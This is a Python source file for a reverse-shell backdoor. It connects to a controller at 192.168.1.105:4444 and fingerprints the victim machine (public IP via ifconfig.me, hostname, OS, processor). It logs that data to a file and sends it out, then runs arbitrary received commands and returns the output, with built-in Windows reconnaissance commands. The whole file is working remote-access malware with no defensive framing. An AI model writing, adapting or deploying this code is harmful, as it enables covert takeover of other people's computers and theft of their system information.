import os, socket, http.client
import subprocess, platform
from subprocess import call

SERVER_IP = '192.168.1.105'
SERVER_PORT = 4444

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect((SERVER_IP, SERVER_PORT))

def target_ip():
    try:
        get_request = http.client.HTTPConnection('ifconfig.me')
        get_request.request('GET', '/ip')
        return(str(get_request.getresponse().read().decode()))
    except:
        return(' - ')

def target_hostname():
    return(str(socket.gethostname()))

def target_os():
    return(str(platform.platform()))

def target_proc():
    return(str(platform.processor()))

def main():
    connection.send(target_ip().encode())
    with open('data_lib.txt', 'a') as f:
        f.write('\n[-]Target IP: ' + str(target_ip()) + '\n')
        f.write('[-]Target PC: ' + str(target_hostname()) + '\n')
        f.write('[-]Target OS: ' + str(target_os()) + '\n')
        f.write('[-]Processor: ' + str(target_proc()) + '\n')
        f.close()

        with open('data_lib.txt', 'r') as f:
            target_info = f.read()
            connection.send(target_info.encode())
            f.close()
main()

while True:
    BUFFER_SIZE = 4096
    command = connection.recv(BUFFER_SIZE).decode()
    
    if command.lower() == 'exit':
        break
    elif command.lower() == 'ipconfig /all':
        answer = subprocess.check_output(['ipconfig', '/all'], stderr = subprocess.PIPE)
        answer = answer.decode('CP866')
    elif command.lower() == 'netstat -ano':
        answer = subprocess.check_output(['netstat', '-ano'], stderr = subprocess.PIPE)
        answer = answer.decode('CP866')
    elif command.lower() == 'net start':
        answer = subprocess.check_output(['net', 'start'], stderr = subprocess.PIPE)
        answer = answer.decode('CP866')
    elif command.lower() == 'net user':
        answer = subprocess.check_output(['net', 'user'], stderr = subprocess.PIPE)
        answer = answer.decode('CP866')
    elif command.lower() == 'tasklist /v':
        answer = subprocess.check_output(['tasklist', '/v'], stderr = subprocess.PIPE)
        answer = answer.decode('CP866')
    elif ((command.lower() == '') | (command.lower() == ' ') | (command.lower() == None)):
        answer = 'Undefined command'
    else:
        try:
            answer = subprocess.check_output(command, stderr = subprocess.PIPE)
            answer = answer.decode('CP866')
        except FileNotFoundError:
            answer = 'Error: FileNotFound'        
    try:
        connection.send(answer.encode())
    except:
        answer = ' - '
        connection.send(answer.encode())
connection.close()

